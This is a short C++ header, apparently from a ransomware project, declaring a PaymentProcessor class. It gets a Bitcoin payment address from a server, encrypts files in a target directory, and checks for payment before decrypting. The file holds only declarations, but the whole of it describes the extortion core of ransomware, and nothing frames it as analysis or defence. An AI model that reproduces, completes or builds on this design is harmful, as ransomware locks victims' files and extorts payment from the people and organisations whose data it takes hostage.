#pragma once

#include <bitcoin/bitcoin.hpp>

#include "encrypt.h"

class PaymentProcessor
{
    private:
        Crypt *encryptor;
        bc::wallet::payment_address address;
        const char *targetDir;
    public:
        PaymentProcessor(const char *targetDir); // Gets payment address from server
        int encryptFiles();
        int tryDecrypt(); // Checks for payment and decrypts if possible
};
